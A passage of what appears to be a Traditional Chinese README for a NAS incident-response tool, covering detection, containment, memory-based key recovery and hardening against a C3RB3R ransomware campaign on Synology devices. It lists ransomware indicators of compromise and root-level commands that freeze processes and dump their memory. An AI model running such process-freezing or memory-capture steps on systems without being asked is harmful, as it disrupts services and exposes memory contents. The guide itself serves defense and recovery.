3. **判讀結果：**
   - **`ransomware_files: FAIL` 或任何 `ioc_*`（`ioc_cron`、`ioc_binaries`、`ioc_users`、`ioc_processes`）為 `FAIL`：** NAS 出現正在進行中或已完成的 C3RB3R 入侵指標；請立即前往下方的[復原步驟](#復原步驟) ([CISA #StopRansomware Guide](https://www.cisa.gov/stopransomware/ransomware-guide))。
   - **`external_signins: FAIL`：** 曾有來自 `allowed_networks` 以外的成功登入；請執行 `nas logs --limit 20000` 與 `nas inventory` 檢查是否有未經授權的帳號、排程任務或套件 ([Synology ransomware KB](https://kb.synology.com/en-global/DSM/tutorial/What_to_do_when_NAS_attacked_by_ransomware))。
   - **`exploit_attempts: WARN` 或 `exploit_attempts_logs: WARN`，但所有 `ioc_*` 與 `ransomware_files` 皆為 `PASS`：** 攻擊者曾對 NAS 發送 CVE-2024-10441 payload，而 `ioc_cron` / `ioc_binaries` 為 `PASS` 表示未發現被植入的 `/etc/cron.d/synot*` 或 `/bin/libgld` 殘留物；請立即透過 `nas incident fix` 關閉對外網路暴露並安裝修補程式 ([Synology-SA-24:20](https://www.synology.com/en-global/security/advisory/Synology_SA_24_20))。
   - **`dsm_version`、`firewall`、`quickconnect`、`router_port_forwarding`、`autoblock`、`smb_min_protocol`、`admin_account`、`snapshot_schedule:<share>` 或 `snapshot_worm:<share>` 為 `FAIL`，但無任何入侵指標：** NAS 尚未修補或暴露於外網，但尚未受感染；請執行 `nas incident fix --ransom-scan --yes` 套用強化設定 ([Synology C3RB3R statement](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions))。

## 復原步驟

### 1. 優先保留證據與記憶體（切勿立即重開機或還原出廠設定）

- **[第一手來源]** 立即拔除 WAN 網路線或停用路由器連接埠轉送，將 NAS 從網路隔離；除非無法切斷網路，否則切勿直接關機，因為關機或重開機會清除揮發性記憶體（RAM）中的證據 ([CISA #StopRansomware Guide](https://www.cisa.gov/stopransomware/ransomware-guide), [CISA: I've been hit by ransomware](https://www.cisa.gov/stopransomware/ive-been-hit-ransomware))。
- **[第一手來源 / 社群]** 雖然 Synology 的一般勒索軟體知識庫文章直接建議重置系統，但 Synology 2014 年的 SynoLocker 資安公告曾指出重置會抹除解密所需的資訊，且開源工具 `soimy/c3rb3r-rescue` 唯有在 `libgld` 加密程序仍在執行且 NAS 尚未重開機的情況下，才有機會從 RAM 中提取當次工作階段的金鑰素材（請先用 `kill -STOP` 暫停程序並傾印程序記憶體，切勿直接終止程序） ([Synology ransomware KB](https://kb.synology.com/en-global/DSM/tutorial/What_to_do_when_NAS_attacked_by_ransomware), [Synology SynoLocker advisory](https://www.synology.com/en-uk/security/advisory/SynoLocker), [GitHub: soimy/c3rb3r-rescue](https://github.com/soimy/c3rb3r-rescue))。
- **[社群]** `nas incident contain --yes` 可一步完成凍結：它會找出疑似加密程式的程序（`libgld`、`qnetd`、暫存資料夾中的執行檔、以寫入模式開啟 `*.L0CK3D` 或 `read-me3.txt` 的程序；執行檔位於 Synology 路徑下的程序除了開啟上述檔案外還需具備其他可疑條件才會列入），對掃描列出的程序（核對 PID、啟動時間與執行檔皆相同）之每一個執行緒發送 `SIGSTOP`，並確認每個執行緒皆進入狀態 `T`。PID 1、核心執行緒以及掃描腳本本身與其父程序一律不會被發送訊號。加上 `--stop-sync` 也會一併停止執行中的 Cloud Sync、Synology Drive、Hyper Backup 與 Container Manager 套件（停止 Container Manager 會停止所有容器）；`--release` 則會對記錄下來的 PID 發送 `SIGCONT`，並重新啟動先前停止的套件 ([GitHub: soimy/c3rb3r-rescue](https://github.com/soimy/c3rb3r-rescue))。
- **[社群]** `nas incident rescue --yes --capture-dir /SHARE/folder` 會從頭到尾執行 c3rb3r-rescue 的完整步驟：執行上述凍結、以固定 commit 複製（clone）救援工具組、以 root 身分對每個凍結的 PID 執行 `capture_process_memory.py` 並存進新的案件資料夾（必須位於 USB 隨身碟或與受加密資料不同的磁碟區，依掛載來源比對；若要在同一磁碟區執行需加 `--force-same-volume`）、下載至本機電腦、建立虛擬環境（venv）並以 `pip --require-hashes` 安裝工具組相依套件與執行自我測試，接著執行 `recover_process_key.py` 搜尋候選金鑰；`--sample FILE` 會在檔案副本上測試每組候選金鑰，`--decrypt-from DIR --decrypt-to DIR` 則會解密檔案副本。每個步驟都會記錄在工作目錄的 `state.json` 中，重複執行相同指令會從上次中斷處接續執行 ([GitHub: soimy/c3rb3r-rescue](https://github.com/soimy/c3rb3r-rescue))。
- **[媒體報導]** Guru3d 轉述 HKEPC 建議，應停止 Container Manager 中的所有容器、暫停 Hyper Backup 與 Cloud Sync，並拔除網路線或在路由器端切斷對外與對內的 SMB 存取 ([Guru3d, 2026-10-29](https://www.guru3d.com/story/synology-nas-devices-hit-by-l0ck3d-ransomware-campaign/))。
- **[第一手來源]** 在進行任何變更前先匯出鑑識紀錄：保留 `read-me3.txt` 與數個 `.L0CK3D` 檔案的副本、匯出日誌中心（Log Center）封存檔，並執行 `nas --json logs --limit 20000 > logs.json`、`nas --json inventory > inventory.json` 與 `nas --json incident --deep > incident-deep.json` 存檔 ([CISA #StopRansomware Guide](https://www.cisa.gov/stopransomware/ransomware-guide), [Guru3d, 2026-10-29](https://www.guru3d.com/story/synology-nas-devices-hit-by-l0ck3d-ransomware-campaign/))。

### 2. 切勿支付贖金

- **[第一手來源]** 無論是 FBI 或奇虎 360 皆不贊成支付贖金：付錢並不能保證攻擊者會提供解密金鑰或金鑰能夠運作，且截至 2026-10-30 為止，尚無針對 C3RB3R 的通用公開解密工具 ([FBI ransomware guidance](https://www.fbi.gov/contact-us/field-offices/memphis/news/press-releases/fbi-memphis-field-office-reminds-tennesseans-about-the-risk-of-ransomware), [360, 2026-10-29](https://www.360.cn/n/13055.html), [CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/))。

### 3. 重新連網前務必徹底清除持久化後門

- **[第一手來源 / 社群]** 單靠安裝 DSM 更新並不會移除攻擊者植入的後門；請檢查並清除 `/etc/cron.d/synot*`、DSM 任務排程表（Task Scheduler）任務、`/bin/libgld`、`/bin/qnetd`、`/bin/l0ck.enc`、未經授權的帳號或家目錄（例如 `admin2`）以及 SSH `authorized_keys`，或是在保留證據後執行乾淨的 DSM 重新安裝 ([Midnight Blue RISK:STATION, 2024-11-01](https://www.midnightblue.nl/research/riskstation), [Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。

### 4. 從 Btrfs 快照或離線備份還原資料

- **[社群 / 媒體報導]** 還原前，請先確認目標 Btrfs 快照（`Snapshot Replication > Snapshots > select shared folder > Restore to this snapshot`（Snapshot Replication > 快照 > 選擇共用資料夾 > 還原至此快照）或 File Station 中的 `#snapshot`）或離線／異地 Hyper Backup 版本的時間點早於最早產生的 `read-me3.txt` 時間戳記 ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。
- **[第一手來源 / 社群]** 還原資料或重新安裝 DSM 後，請將 DSM 更新至 SA-26:13 修補版本（執行 `nas upgrade --yes`，並確認 `/etc.defaults/VERSION` 中的 `smallfixnumber`）、更新或停用 SA-26:14 相關套件、更換所有管理員與服務密碼，並在重新連上網路前執行 `nas incident --scan --deep` 確認系統處於乾淨狀態 ([Synology-SA-26:13](https://www.synology.com/en-global/security/advisory/Synology_SA_26_13), [Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。

## 預防措施

- **修補 DSM 與套件：** 將 DSM 保持在最新的 SA-26:13 / SA-24:20 修補版本（`nas status`、`nas upgrade --yes`），並針對 SA-26:14 保持套件中心（Package Center）內的套件為最新狀態（`nas inventory`、`nas incident fix --only packages`） ([Synology-SA-26:13](https://www.synology.com/en-global/security/advisory/Synology_SA_26_13), [Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14))。
- **移除網際網路暴露面：** 停用 QuickConnect（`nas incident fix --only quickconnect`）、停用 UPnP 路由器連接埠轉送規則（`nas incident fix --only router_port_forwarding`），並啟用預設拒絕（default-deny）、僅放行區網／VPN 子網路的 DSM 防火牆（`nas incident fix --only firewall`） ([Midnight Blue RISK:STATION](https://www.midnightblue.nl/research/riskstation), [Synology Firewall Help](https://kb.synology.com/en-global/DSM/help/DSM/AdminCenter/connection_security_firewall?version=7))。
- **強化身分驗證與通訊協定：** 停用預設的 `admin` 帳號、啟用兩步驟驗證、開啟自動封鎖（AutoBlock），並將最低 SMB 通訊協定設為 SMB2（`nas incident fix --only admin_account,autoblock,smb_min_protocol`） ([Synology Security Tutorial](https://kb.synology.com/zh-tw/DSM/tutorial/How_to_add_extra_security_to_your_Synology_NAS))。
- **保護快照與離線備份：** 啟用排程 Btrfs 快照（並在支援的機型上啟用不可變快照 Immutable Snapshots，同時透過 `nas incident fix --only snapshot_worm,snapshots --ransom-scan` 避開不支援機型上的 WORM API 鎖定陷阱），並維持離線或異地的 3-2-1 備份原則 ([Synology Ransomware Prevention Tutorial](https://kb.synology.com/en-global/DSM/tutorial/How_can_I_prevent_ransomeware_attacks_on_my_Synology_device), [Synology WriteOnce KB](https://kb.synology.com/en-global/DSM/tutorial/which_synology_nas_models_support_WriteOnce_and_secure_snapshots))。
- **完整檢查清單：** 完整的 DSM 資安強化指南請見 [`HARDENING.md`](HARDENING.md)，鎖定排除與救援方案請見 [`TROUBLESHOOTING.md`](TROUBLESHOOTING.md) ([CISA #StopRansomware Guide](https://www.cisa.gov/stopransomware/ransomware-guide))。
